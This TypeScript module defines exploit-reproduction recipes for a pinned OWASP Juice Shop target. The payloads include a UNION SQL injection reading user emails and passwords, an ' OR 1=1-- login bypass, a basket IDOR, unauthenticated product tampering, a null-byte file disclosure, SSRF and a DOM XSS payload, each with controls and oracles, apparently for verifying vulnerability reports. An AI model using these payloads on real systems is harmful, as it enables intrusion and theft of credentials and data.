import type {
  GetRecipesForTargetFn,
  ReproductionProbeResult,
  ReproductionRecipe,
  ReproductionRequest,
} from "@/lib/reproduction/types";
import { additionalRecipesForTarget } from "./recipes.additional";

/**
 * Reproduction scenarios from docs/decisions.md Q18, against the one pinned Juice Shop target.
 * Recipes are code because `oracleCheck` cannot live in a jsonb column (see the type doc in
 * lib/reproduction/types.ts). Only the target-specific values -- base URL, search path, canary
 * registration path -- come from the bound TargetProfile's `config`; the frozen scenario inputs
 * (exploit payloads, fixture password, expected status codes) are constants in this module,
 * matching the spec Q18 froze rather than anything a report or agent could supply.
 */

/** Substituted by the orchestrator with a fresh, unpredictable value before the request is
 * sent. Every request in a recipe run shares the one canary. */
const CANARY_PLACEHOLDER = "{{canary}}";

/**
 * Juice Shop enforces no password strength rule at all (models/user.ts has no length or
 * complexity validator, only a hash-on-write setter), so any non-empty string registers
 * cleanly. Fixed rather than random purely for readable fixture logs.
 */
const FIXTURE_PASSWORD = "bd-fixture-Only1!";

type JuiceShopConfig = {
  baseUrl: string;
  searchPath: string;
  canaryRegistrationPath: string;
};

/**
 * `target.config` is `unknown` at the type level (a jsonb column in practice), so narrow it
 * before reading anything out of it rather than casting. `baseUrl` is validated for
 * completeness even though it plays no part in the paths below -- the orchestrator resolves
 * these relative paths against the target's own base URL, not the recipe.
 */
function isJuiceShopConfig(config: unknown): config is JuiceShopConfig {
  if (typeof config !== "object" || config === null) return false;
  const c = config as Record<string, unknown>;
  return (
    typeof c.baseUrl === "string" &&
    typeof c.searchPath === "string" &&
    typeof c.canaryRegistrationPath === "string"
  );
}

/**
 * Registers a fresh user through Juice Shop's public registration endpoint. This is the
 * trusted fixture: the canary email lands in the Users table the UNION payload reads from, with
 * no direct database access and no image modification -- see decisions.md Q18, "How the canary
 * gets seeded."
 *
 * Body shape verified against the pinned v17.3.0 source, not guessed: models/user.ts declares
 * only `email` and `password` (no `passwordRepeat`, `securityQuestion` or `securityAnswer`
 * field on the User model), and server.ts's pre-finale handler for `POST /api/Users` only acts
 * on `passwordRepeat` when it is present -- omitting it, or including it, both register
 * successfully. `passwordRepeat` is included anyway because it is what the real registration
 * form sends and costs nothing to match.
 */
function registrationFixture(config: JuiceShopConfig): { request: ReproductionRequest } {
  return {
    request: {
      method: "POST",
      path: config.canaryRegistrationPath,
      body: {
        email: CANARY_PLACEHOLDER,
        password: FIXTURE_PASSWORD,
        passwordRepeat: FIXTURE_PASSWORD,
      },
    },
  };
}

/** Frozen in decisions.md Q18: 9 columns, email in position 2, password in position 3. */
const SQLI_SEARCH_PAYLOAD =
  "qwert')) UNION SELECT id,email,password,'4','5','6','7','8','9' FROM Users--";

/**
 * The search route runs `SELECT * FROM Products WHERE ...` (routes/search.ts), so a compound
 * UNION result takes its column names from Products, not from Users: id, name, description,
 * price, deluxePrice, image, createdAt, updatedAt, deletedAt (models/product.ts, plus
 * Sequelize's default timestamps and the paranoid `deletedAt`). Position 2 of the UNION is
 * therefore returned to the client under the key "name", holding the injected email -- never a
 * field literally called "email". Checking "name" specifically (rather than a raw substring
 * search over the whole body, which is what Juice Shop's own internal challenge tracker does)
 * is what keeps a canary that coincidentally appears elsewhere in the payload from counting.
 */
function canaryInSearchResponse(body: string, canary: string): boolean {
  let parsed: unknown;
  try {
    parsed = JSON.parse(body);
  } catch {
    return false;
  }
  if (typeof parsed !== "object" || parsed === null) return false;
  const rows = (parsed as { data?: unknown }).data;
  if (!Array.isArray(rows)) return false;
  return rows.some((row) => {
    if (typeof row !== "object" || row === null) return false;
    const name = (row as Record<string, unknown>).name;
    return typeof name === "string" && name.includes(canary);
  });
}

function sqliSearchRecipe(config: JuiceShopConfig): ReproductionRecipe {
  return {
    id: "juice-shop-sqli-search",
    title: "Reflected UNION SQL injection in product search",
    keywords: [
      "sql injection",
      "sqli",
      "union select",
      "product search",
      "search endpoint",
      config.searchPath,
    ],
    fixture: registrationFixture(config),
    negativeControl: {
      method: "GET",
      path: `${config.searchPath}?q=apple`,
    },
    exploit: {
      method: "GET",
      path: `${config.searchPath}?q=${encodeURIComponent(SQLI_SEARCH_PAYLOAD)}`,
    },
    oracleCheck: (response, canary) =>
      response.status === 200 && canaryInSearchResponse(response.body, canary),
  };
}

/** Frozen in decisions.md Q18: `POST /rest/user/login` for the exploit and its negative
 * control, `GET /api/Users` for the follow-up that proves the minted token grants access. Not
 * config, unlike `searchPath`: Juice Shop's own routing fixes both, so nothing about them varies
 * across a rebuild of the same pinned target. */
const LOGIN_PATH = "/rest/user/login";
const USERS_PATH = "/api/Users";

/**
 * Frozen in decisions.md Q18: a classic always-true WHERE clause, closing out the query with a
 * comment so nothing after it (the password check) still applies. It matches the first row in
 * the Users table -- id 1, the seeded admin account -- regardless of what password is sent.
 */
const LOGIN_BYPASS_EMAIL = "' OR 1=1--";

/**
 * routes/login.ts replies with `{ authentication: { token, bid, umail } }` on a successful
 * login (the JWT security.authorize(user) mints) and something else entirely -- no
 * `authentication` object -- on a 401. Returns undefined for anything that isn't a well-formed
 * token, which is exactly the signal both call sites below need: "was there a token to chase at
 * all."
 */
function extractAuthToken(response: ReproductionProbeResult): string | undefined {
  let parsed: unknown;
  try {
    parsed = JSON.parse(response.body);
  } catch {
    return undefined;
  }
  if (typeof parsed !== "object" || parsed === null) return undefined;
  const authentication = (parsed as Record<string, unknown>).authentication;
  if (typeof authentication !== "object" || authentication === null) return undefined;
  const token = (authentication as Record<string, unknown>).token;
  return typeof token === "string" && token.length > 0 ? token : undefined;
}

/**
 * Builds the exploit's follow-up: the minted token, presented the way Juice Shop's own
 * `express-jwt`-backed `security.isAuthorized()` middleware expects it -- `utils.jwtFrom(req)`
 * reads a standard `Authorization: Bearer <token>` header (lib/insecurity.ts). Returns undefined
 * when the exploit response minted nothing, e.g. the injection didn't work this run: that is a
 * complete exploit leg with no proof, not a request worth sending.
 */
function buildUsersFollowUpRequest(exploitResponse: ReproductionProbeResult): ReproductionRequest | undefined {
  const token = extractAuthToken(exploitResponse);
  if (!token) return undefined;
  return {
    method: "GET",
    path: USERS_PATH,
    headers: { Authorization: `Bearer ${token}` },
  };
}

/**
 * `GET /api/Users` is the finale-backed admin listing (server.ts's `autoModels`, User excluding
 * only `password` and `totpSecret`), wrapped by the same `{ status, data: [...] }` shape as
 * every other finale route. Unlike the search recipe's UNION result -- where the query's own
 * column order remaps the injected email to a field literally called "name" -- this listing
 * returns the real `email` column verbatim, so the canary lands under its own name here.
 */
function canaryInUsersResponse(body: string, canary: string): boolean {
  let parsed: unknown;
  try {
    parsed = JSON.parse(body);
  } catch {
    return false;
  }
  if (typeof parsed !== "object" || parsed === null) return false;
  const rows = (parsed as { data?: unknown }).data;
  if (!Array.isArray(rows)) return false;
  return rows.some((row) => {
    if (typeof row !== "object" || row === null) return false;
    const email = (row as Record<string, unknown>).email;
    return typeof email === "string" && email.includes(canary);
  });
}

function loginBypassRecipe(config: JuiceShopConfig): ReproductionRecipe {
  return {
    id: "juice-shop-login-bypass",
    title: "Authentication bypass via SQL injection in login",
    keywords: ["sql injection", "sqli", "auth bypass", "authentication bypass", "login bypass", LOGIN_PATH],
    fixture: registrationFixture(config),
    // The negative control is the same login with the canary's own email but a wrong password,
    // which Juice Shop correctly rejects with 401 -- a legitimate, complete answer, not an
    // infrastructure failure, hence negativeControlAcceptedStatuses below.
    negativeControl: {
      method: "POST",
      path: LOGIN_PATH,
      body: { email: CANARY_PLACEHOLDER, password: "definitely-the-wrong-password" },
    },
    negativeControlAcceptedStatuses: [401],
    exploit: {
      method: "POST",
      path: LOGIN_PATH,
      body: { email: LOGIN_BYPASS_EMAIL, password: "x" },
    },
    // Used for the negative control (expect no token from a rejected login). The exploit leg is
    // decided by exploitFollowUp below instead: a minted token alone proves nothing, since any
    // successful login -- injected or not -- would mint one.
    oracleCheck: (response) => extractAuthToken(response) !== undefined,
    exploitFollowUp: {
      buildRequest: buildUsersFollowUpRequest,
      oracleCheck: (response, canary) => canaryInUsersResponse(response.body, canary),
    },
  };
}

const PRODUCTS_API_PATH = "/api/Products";
const BASKET_ITEMS_API_PATH = "/api/BasketItems";
const BASKET_REST_PATH = "/rest/basket";

/**
 * Extracts `authentication.bid` as a string from `POST /rest/user/login`. `routes/login.ts` calls
 * `BasketModel.findOrCreate({ where: { UserId } })` on login and returns the user's basket id under
 * `authentication.bid`.
 */
function extractBasketId(response: ReproductionProbeResult): string | undefined {
  let parsed: unknown;
  try {
    parsed = JSON.parse(response.body);
  } catch {
    return undefined;
  }
  if (typeof parsed !== "object" || parsed === null) return undefined;
  const authentication = (parsed as Record<string, unknown>).authentication;
  if (typeof authentication !== "object" || authentication === null) return undefined;
  const bid = (authentication as Record<string, unknown>).bid;
  if (typeof bid === "number" && Number.isInteger(bid) && bid > 0) return String(bid);
  if (typeof bid === "string" && bid.length > 0) return bid;
  return undefined;
}

/**
 * `GET /rest/basket/:id` returns `{ status: "success", data: { id, Products: [...] } }`.
 * Checking `Products[].description` specifically (rather than a raw substring match on the body)
 * proves that the response returned the basket containing the canary-tagged item seeded for
 * principal B, while principal A's own empty basket returns `Products: []`.
 */
function canaryInBasketProducts(body: string, canary: string): boolean {
  let parsed: unknown;
  try {
    parsed = JSON.parse(body);
  } catch {
    return false;
  }
  if (typeof parsed !== "object" || parsed === null) return false;
  const data = (parsed as { data?: unknown }).data;
  if (typeof data !== "object" || data === null) return false;
  const products = (data as Record<string, unknown>).Products;
  if (!Array.isArray(products)) return false;
  return products.some((product) => {
    if (typeof product !== "object" || product === null) return false;
    const description = (product as Record<string, unknown>).description;
    return typeof description === "string" && description.includes(canary);
  });
}

/**
 * Two-identity IDOR on `GET /rest/basket/:id` (routes/basket.ts). The route is behind
 * `security.isAuthorized()`, which checks that a valid JWT is present, and `retrieveBasket()`
 * fetches `BasketModel.findOne({ where: { id: req.params.id }, include: [Products] })` without
 * checking whether the basket belongs to the authenticated caller.
 *
 * The fixture registers principal B (`{{canary}}`). Setup logs in as B (capturing `victimToken` and
 * `victimBasketId`), updates Product 1's description to `{{canary}}` via unauthenticated
 * `PUT /api/Products/1` (`changeProductChallenge` leaves `PUT /api/Products/:id` open in finale),
 * adds Product 1 to B's basket via `POST /api/BasketItems`, and then registers and logs in a second
 * principal A (`second-{{canary}}`, capturing `attackerToken` and `attackerBasketId`). The negative
 * control has A read A's own basket (`attackerBasketId`), which is empty and does not contain the
 * canary; the exploit has A read B's basket (`victimBasketId`) using A's own Bearer token, which
 * discloses B's canary-tagged basket item.
 *
 * The additional control reads B's basket with no Authorization header at all. Juice Shop answers
 * that with 401, which that control alone accepts. If the endpoint served anyone, the same canary
 * would come back to a principal-free request, so the run is ANALYSIS_ONLY instead of a
 * cross-principal IDOR: an endpoint open to everyone is not an IDOR.
 */
function idorBasketRecipe(config: JuiceShopConfig): ReproductionRecipe {
  const secondPrincipalEmail = `second-${CANARY_PLACEHOLDER}`;
  return {
    id: "juice-shop-idor-basket",
    title: "IDOR on shopping basket retrieval across principals",
    keywords: ["idor", "insecure direct object reference", "broken access control", "basket", BASKET_REST_PATH],
    fixture: registrationFixture(config),
    setup: [
      {
        request: {
          method: "POST",
          path: LOGIN_PATH,
          body: { email: CANARY_PLACEHOLDER, password: FIXTURE_PASSWORD },
        },
        capture: {
          victimToken: extractAuthToken,
          victimBasketId: extractBasketId,
        },
      },
      {
        request: {
          method: "PUT",
          path: `${PRODUCTS_API_PATH}/1`,
          body: {
            description: CANARY_PLACEHOLDER,
          },
        },
      },
      {
        request: {
          method: "POST",
          path: BASKET_ITEMS_API_PATH,
          headers: { Authorization: "Bearer {{victimToken}}" },
          body: {
            ProductId: 1,
            BasketId: "{{victimBasketId}}",
            quantity: 1,
          },
        },
      },
      {
        request: {
          method: "POST",
          path: config.canaryRegistrationPath,
          body: {
            email: secondPrincipalEmail,
            password: FIXTURE_PASSWORD,
            passwordRepeat: FIXTURE_PASSWORD,
          },
        },
      },
      {
        request: {
          method: "POST",
          path: LOGIN_PATH,
          body: { email: secondPrincipalEmail, password: FIXTURE_PASSWORD },
        },
        capture: {
          attackerToken: extractAuthToken,
          attackerBasketId: extractBasketId,
        },
      },
    ],
    negativeControl: {
      method: "GET",
      path: `${BASKET_REST_PATH}/{{attackerBasketId}}`,
      headers: { Authorization: "Bearer {{attackerToken}}" },
    },
    additionalNegativeControls: [
      { request: { method: "GET", path: `${BASKET_REST_PATH}/{{victimBasketId}}` }, acceptedStatuses: [401] },
    ],
    exploit: {
      method: "GET",
      path: `${BASKET_REST_PATH}/{{victimBasketId}}`,
      headers: { Authorization: "Bearer {{attackerToken}}" },
    },
    oracleCheck: (response, canary) =>
      response.status === 200 && canaryInBasketProducts(response.body, canary),
  };
}

const PRODUCT_ONE_PATH = `${PRODUCTS_API_PATH}/1`;

/**
 * Checks the product record a single-product read returns. server.ts wraps finale responses in
 * `{ status, data }` ("fix the api difference" in the autoModels loop), but the wrap is applied
 * through a finale hook, so the check accepts a bare record as well and does not depend on which
 * read path the hook reaches. The canary must be this product's own description.
 */
function canaryInProductDescription(body: string, canary: string): boolean {
  let parsed: unknown;
  try {
    parsed = JSON.parse(body);
  } catch {
    return false;
  }
  if (typeof parsed !== "object" || parsed === null) return false;
  const wrapped = (parsed as { data?: unknown }).data;
  const product = wrapped ?? parsed;
  if (typeof product !== "object" || product === null) return false;
  const description = (product as Record<string, unknown>).description;
  return typeof description === "string" && description.includes(canary);
}

/**
 * Unauthenticated write on `PUT /api/Products/:id` (the "Product Tampering" challenge). In the
 * pinned v17.3.0 server.ts the only authorization line for that route is commented out:
 * `// app.put('/api/Products/:id', security.isAuthorized())`, so finale serves the update to any
 * caller. `POST /api/Products` and `DELETE /api/Products/:id` keep their guards.
 *
 * The exploit writes the run's canary into product 1's description with no Authorization header.
 * The follow-up is an unauthenticated `GET /api/Products/1`, which is decisive because the
 * canary has to be stored to come back: the exploit's own echo proves nothing about persistence.
 *
 * The negative control is an unauthenticated `PUT /api/Users/1`, which server.ts guards with
 * `.put(security.denyAll())`. A denied write answers 401 (expressJwt with a random secret rejects
 * every token), which is accepted as a complete leg. The control body carries the canary in
 * `email`, so an accepted write would echo it back and be treated as a dirty control.
 */
function productTamperingRecipe(config: JuiceShopConfig): ReproductionRecipe {
  return {
    id: "juice-shop-product-tampering-unauth",
    title: "Unauthenticated product update via PUT /api/Products/:id",
    keywords: [
      "auth bypass",
      "broken access control",
      "missing authentication",
      "product tampering",
      PRODUCTS_API_PATH,
    ],
    fixture: registrationFixture(config),
    negativeControl: {
      method: "PUT",
      path: `${USERS_PATH}/1`,
      body: { email: CANARY_PLACEHOLDER },
    },
    negativeControlAcceptedStatuses: [401],
    exploit: {
      method: "PUT",
      path: PRODUCT_ONE_PATH,
      body: { description: CANARY_PLACEHOLDER },
    },
    // A raw body match is enough here: the control only has to stay clean, and a coincidental
    // echo would fail closed as ANALYSIS_ONLY rather than produce a false REPRODUCED.
    oracleCheck: (response, canary) =>
      response.status >= 200 && response.status < 300 && response.body.includes(canary),
    exploitFollowUp: {
      buildRequest: () => ({ method: "GET", path: PRODUCT_ONE_PATH }),
      oracleCheck: (response, canary) =>
        response.status === 200 && canaryInProductDescription(response.body, canary),
    },
  };
}

const FTP_PATH = "/ftp";
const FTP_BACKUP_FILE = "package.json.bak";

/**
 * `GET /ftp/package.json.bak%2500.md` bypasses `endsWithAllowlistedFileType` in
 * `routes/fileServer.ts` (which allows only `.md` and `.pdf`) because `cutOffPoisonNullByte`
 * truncates at `%00` after the extension check, so `res.sendFile(path.resolve('ftp/', file))`
 * serves `ftp/package.json.bak`. Parsing the returned JSON and checking both `"name": "juice-shop"`
 * and `"version"` confirms the backup file content was disclosed rather than a generic 200 page or
 * the public `legal.md` control.
 */
function isBackupPackageJson(body: string): boolean {
  let parsed: unknown;
  try {
    parsed = JSON.parse(body);
  } catch {
    return false;
  }
  if (typeof parsed !== "object" || parsed === null) return false;
  const pkg = parsed as Record<string, unknown>;
  return pkg.name === "juice-shop" && typeof pkg.version === "string" && pkg.version.length > 0;
}

function ftpPoisonNullByteRecipe(config: JuiceShopConfig): ReproductionRecipe {
  return {
    id: "juice-shop-ftp-poison-null-byte",
    title: "Poison null-byte filter bypass on /ftp file download",
    keywords: [
      "path traversal",
      "poison null byte",
      "null byte",
      "file disclosure",
      FTP_BACKUP_FILE,
      "coupons_2013.md.bak",
      FTP_PATH,
    ],
    fixture: registrationFixture(config),
    negativeControl: {
      method: "GET",
      path: `${FTP_PATH}/legal.md`,
    },
    exploit: {
      method: "GET",
      path: `${FTP_PATH}/${FTP_BACKUP_FILE}%2500.md`,
    },
    oracleCheck: (response) => response.status === 200 && isBackupPackageJson(response.body),
  };
}

const PROFILE_IMAGE_URL_UPLOAD_PATH = "/profile/image/url";

/**
 * Out-of-band SSRF on `POST /profile/image/url` (routes/profileImageUrlUpload.ts). When an
 * authenticated user submits `imageUrl`, the server calls `fetch(url)` directly without host
 * filtering and redirects to `/profile` (`302`).
 *
 * The orchestrator boots an isolated, internet-blocked OOB listener peer sandbox link-joined to
 * the target (`oobListener: { port: 8080 }`) and exposes its private link address as `{{oobUrl}}`.
 * The fixture registers a fresh user (`{{canary}}`), setup logs in and captures `userToken`, the
 * negative control hits `GET /profile` with that token (no `imageUrl` submitted, so the listener
 * sees no callback), and the exploit posts `imageUrl: "{{oobUrl}}/{{canary}}.jpg"` with
 * `Cookie: token={{userToken}}`. The run reproduces only when the listener records a callback
 * carrying this run's `{{canary}}`.
 */
function ssrfProfileImageRecipe(config: JuiceShopConfig): ReproductionRecipe {
  return {
    id: "juice-shop-ssrf-profile-image",
    title: "Server-side request forgery in profile image URL upload",
    keywords: ["ssrf", "server-side request forgery", "imageUrl", PROFILE_IMAGE_URL_UPLOAD_PATH],
    fixture: registrationFixture(config),
    oobListener: { port: 8080 },
    setup: [
      {
        request: {
          method: "POST",
          path: LOGIN_PATH,
          body: { email: CANARY_PLACEHOLDER, password: FIXTURE_PASSWORD },
        },
        capture: {
          userToken: extractAuthToken,
        },
      },
    ],
    negativeControl: {
      method: "GET",
      path: "/profile",
      headers: { Cookie: "token={{userToken}}" },
    },
    negativeControlAcceptedStatuses: [302],
    exploit: {
      method: "POST",
      path: PROFILE_IMAGE_URL_UPLOAD_PATH,
      headers: { Cookie: "token={{userToken}}" },
      body: { imageUrl: `{{oobUrl}}/${CANARY_PLACEHOLDER}.jpg` },
    },
    oracleCheck: () => false,
  };
}

/**
 * Juice Shop's search view renders the `q` route parameter into the page with
 * `bypassSecurityTrustHtml` and an `[innerHTML]` binding (the localXssChallenge), so a payload in
 * the search route executes in the DOM. The route is hash based (`/#/search?q=...`), so `q` and its
 * payload live in the URL fragment, which the browser never sends to the server. That is what the
 * browser oracle needs: the canary reaches the page only through the fragment and the sink is
 * `document.title`, which only script can set, so the canary landing in the title proves the DOM
 * sink executed, not that the server reflected a value.
 *
 * Verified against the pinned v17.3.0 image: the exploit payload sets the title to the run canary,
 * and the inert negative control leaves it as "OWASP Juice Shop". The path is "/" (the app shell);
 * the whole client route rides in hashPayload after the fragment marker.
 */
function domXssSearchRecipe(): ReproductionRecipe {
  return {
    id: "juice-shop-dom-xss-search",
    title: "DOM XSS in the client-side product search",
    keywords: [
      "xss",
      "dom xss",
      "cross-site scripting",
      "client-side",
      "product search",
      "search",
    ],
    // Required by the type but unused on the browser path: reproduce.ts runs browserExploit in
    // place of the HTTP fixture/negativeControl/exploit legs (see its doc on ReproductionRecipe).
    fixture: { request: { method: "POST", path: "/unused", body: {} } },
    negativeControl: { method: "GET", path: "/unused" },
    exploit: { method: "GET", path: "/unused" },
    oracleCheck: () => false,
    browserExploit: {
      sink: "title",
      negativeControl: { path: "/", hashPayload: "/search?q=plain-{{canary}}" },
      exploit: {
        path: "/",
        hashPayload: `/search?q=<img src=x onerror="document.title='{{canary}}'">`,
      },
    },
  };
}

export const getRecipesForTarget: GetRecipesForTargetFn = (target) => {
  if (target.name === "juice-shop-v17.3.0") {
    if (!isJuiceShopConfig(target.config)) return [];
    return [
      sqliSearchRecipe(target.config),
      loginBypassRecipe(target.config),
      idorBasketRecipe(target.config),
      productTamperingRecipe(target.config),
      ftpPoisonNullByteRecipe(target.config),
      ssrfProfileImageRecipe(target.config),
      domXssSearchRecipe(),
    ];
  }
  // Every other onboarding target dispatches through its own module, so juice-shop's frozen
  // recipes above stay untouched. See lib/targets/recipes.additional.ts.
  return additionalRecipesForTarget(target);
};
